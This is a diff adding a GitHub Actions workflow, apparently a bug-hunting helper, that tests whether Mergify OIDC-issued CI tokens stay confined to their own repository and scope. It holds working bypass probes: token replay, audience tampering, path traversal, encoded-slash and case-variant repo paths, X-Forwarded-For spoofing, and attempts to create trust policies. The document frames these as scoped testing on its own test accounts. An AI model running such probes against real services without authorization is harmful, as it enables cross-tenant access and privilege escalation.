@@ -1,0 +1,110 @@
+# HITL helper v2 for anom-000-03 (Mergify OIDC CI token scope confinement).
+# Commit as .github/workflows/mergify-oidc-probe.yml in BlackPointSystem/mergify-test
+# (replace the v1 file if it is there), then Actions tab -> "mergify-oidc-probe" -> Run workflow
+# on branch main with the default inputs. The trust policy it needs already exists on
+# BlackPointSystem (id 100ecc72-..., repo id 1470414359 only, any event/workflow/environment).
+#
+# The repo is PUBLIC, so its Actions logs are public: this job prints ONLY status codes and
+# short response bodies; every token is masked with ::add-mask:: and never echoed.
+# Copy the whole job log into auth/HITL-oidc-run-<n>.txt (local only).
+#
+# Writes it makes (all benign, all on the two test accounts' own repos):
+#  - scopes "h006-own" on A's own commit (baseline) and "h006-xtenant" on B's head commit
+#  - an empty OTLP traces payload to A's repo (baseline) and B's repo
+#  - one quarantine entry "h006-dummy-test" and one trust policy "h006-ci-escalation" on A
+#    (only succeed if the CI token exceeds its ci scope; the hunt agent deletes them after)
+name: mergify-oidc-probe
+on:
+  workflow_dispatch:
+    inputs:
+      other_owner: {description: "B's owner", required: false, default: "Pingunino"}
+      other_repo: {description: "B's repo", required: false, default: "mergify-test"}
+      other_repo_id: {description: "B's repo id", required: false, default: "1470419900"}
+      other_sha: {description: "a commit sha of B's repo", required: false, default: "6654ac3b77c8151b134e24ff75a1be69ae08d7fb"}
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: probe
+        env:
+          OO: ${{ inputs.other_owner }}
+          OR: ${{ inputs.other_repo }}
+          ORID: ${{ inputs.other_repo_id }}
+          OSHA: ${{ inputs.other_sha }}
+        run: |
+          set -u
+          API=https://api.mergify.com/v1
+          OWNER="${GITHUB_REPOSITORY%%/*}"; REPO="${GITHUB_REPOSITORY#*/}"
+          echo "event=$GITHUB_EVENT_NAME ref=$GITHUB_REF repo=$GITHUB_REPOSITORY sha=$GITHUB_SHA"
+          idtok() {
+            local u="$ACTIONS_ID_TOKEN_REQUEST_URL"
+            if [ -n "$1" ]; then u="$u&audience=$(jq -rn --arg a "$1" '$a|@uri')"; fi
+            local t; t=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$u" | jq -r .value)
+            echo "::add-mask::$t"; printf '%s' "$t"
+          }
+          claims() { printf '%s' "$1" | cut -d. -f2 | tr '_-' '/+' | { b=$(cat); while [ $(( ${#b} % 4 )) -ne 0 ]; do b="$b="; done; printf '%s' "$b"; } | base64 -d 2>/dev/null | jq -c '{aud,repository,repository_id,repository_owner,repository_owner_id,ref,event_name,workflow_ref,job_workflow_ref,environment,repository_visibility}' 2>/dev/null; }
+          CI_TOK=""
+          xchg() {
+            local code
+            code=$(curl -sS -o /tmp/x.json -w '%{http_code}' -X POST "$API/ci/oidc/exchange" -H 'content-type: application/json' --data "$(jq -cn --arg t "$2" '{id_token:$t}')")
+            if [ "$code" = 200 ]; then CI_TOK=$(jq -r .token /tmp/x.json); echo "::add-mask::$CI_TOK"; echo "$1 -> 200 expires_in=$(jq -r .expires_in /tmp/x.json)"
+            else echo "$1 -> $code $(jq -c '{error_code,detail}' /tmp/x.json 2>/dev/null | cut -c1-300)"; fi
+          }
+          T=$(idtok "https://api.mergify.com"); echo "id-token claims: $(claims "$T")"
+          xchg "X1 aud=https://api.mergify.com" "$T"; GOOD="$CI_TOK"
+          CI_TOK=""; xchg "X2 same id token replayed" "$T"; [ -n "$CI_TOK" ] && echo "X2 replay accepted"
+          for aud in "https://api.mergify.com/" "https://API.mergify.com" "https://api.mergify.com.example.org" ""; do
+            CI_TOK=""; xchg "X aud='${aud:-<github default>}'" "$(idtok "$aud")"
+          done
+          [ -z "$GOOD" ] && { echo "no CI token - stop"; exit 0; }
+          # token shape only (never the value)
+          echo "ci token shape: len=${#GOOD} prefix=${GOOD:0:4} dots=$(printf '%s' "$GOOD" | tr -cd . | wc -c)"
+          if [ "$(printf '%s' "$GOOD" | tr -cd . | wc -c)" = 2 ]; then echo "ci token claims (no signature): $(printf '%s' "$GOOD" | cut -d. -f2 | tr '_-' '/+' | { b=$(cat); while [ $(( ${#b} % 4 )) -ne 0 ]; do b="$b="; done; printf '%s' "$b"; } | base64 -d 2>/dev/null | head -c 600)"; fi
+          p() {  # label method path [json body] [extra curl args...]
+            local l="$1" m="$2" path="$3" body="${4:-}"; shift 4 2>/dev/null || shift $#
+            local code
+            if [ -n "$body" ]; then
+              code=$(curl -sS "$@" -o /tmp/p.json -w '%{http_code}' -X "$m" -H "Authorization: Bearer $GOOD" -H 'content-type: application/json' --data "$body" "$API$path")
+            else
+              code=$(curl -sS "$@" -o /tmp/p.json -w '%{http_code}' -X "$m" -H "Authorization: Bearer $GOOD" "$API$path")
+            fi
+            echo "$l $m $path -> $code $(head -c 220 /tmp/p.json | tr '\n' ' ')"
+            sleep 1
+          }
+          S_OWN="{\"scopes\":[\"h006-own\"]}"; S_X="{\"scopes\":[\"h006-xtenant\"]}"
+          OTLP='{"resourceSpans":[]}'
+          echo "--- own repo baseline (expected to work)"
+          p O1 GET "/ci/$OWNER/repositories/$REPO/quarantines"
+          p O2 GET "/ci/$OWNER/repositories/$REPO/test-states"
+          p O3 GET "/ci/$OWNER/repositories/$REPO/tests/runs"
+          p O4 PUT "/repos/$OWNER/$REPO/commits/$GITHUB_SHA/scopes" "$S_OWN"
+          p O5 POST "/ci/$OWNER/repositories/$REPO/traces" "$OTLP"
+          echo "--- B's repo with A's CI token (expected 403/404)"
+          p X1 GET "/ci/$OO/repositories/$OR/quarantines"
+          p X2 GET "/ci/$OO/repositories/$OR/test-states"
+          p X3 GET "/ci/$OO/repositories/$OR/tests/runs"
+          p X4 PUT "/repos/$OO/$OR/commits/$OSHA/scopes" "$S_X"
+          p X5 POST "/ci/$OO/repositories/$OR/traces" "$OTLP"
+          p X6 PUT "/repos/${OO,,}/$OR/commits/$OSHA/scopes" "$S_X"
+          p X7 PUT "/repos/${OO^^}/${OR^^}/commits/$OSHA/scopes" "$S_X"
+          p X8 PUT "/repos/$OO/$ORID/commits/$OSHA/scopes" "$S_X"
+          p X9 PUT "/repos/$OWNER/$REPO/../../$OO/$OR/commits/$OSHA/scopes" "$S_X" --path-as-is
+          p X10 PUT "/repos/$OO/$OR/commits/$OSHA/scopes?owner=$OWNER&repository=$REPO" "$S_X"
+          p X11 PUT "/repos/$OO%2F$OR/commits/$OSHA/scopes" "$S_X"
+          p X12 GET "/ci/$OO/repositories/$OR/quarantines" "" -H "X-Forwarded-For: 127.0.0.1"
+          echo "--- own org, routes outside the ci scope (expected 403)"
+          p E1 GET "/ci/$OWNER/oidc/trust-policies"
+          p E2 GET "/ci/$OWNER/oidc/exchanges"
+          p E3 GET "/application"
+          p E4 GET "/user"
+          p E5 GET "/repos/$OWNER/$REPO/queues"
+          p E6 GET "/repos/$OWNER/$REPO/merge-queue/status"
+          p E7 GET "/orgs/$OWNER/merge-queue/settings"
+          p E8 GET "/ci/$OWNER/repositories/$REPO/search/tests"
+          p E9 POST "/ci/$OWNER/repositories/$REPO/quarantines" '{"test_name":"h006-dummy-test","reason":"h006 scope probe"}'
+          p E10 POST "/ci/$OWNER/oidc/trust-policies" '{"name":"h006-ci-escalation","provider":"github_actions","repositories":{"mode":"all"}}'
+          p E11 POST "/ci/oidc/exchange" "$(jq -cn --arg t "$GOOD" '{id_token:$t}')"
+          echo done
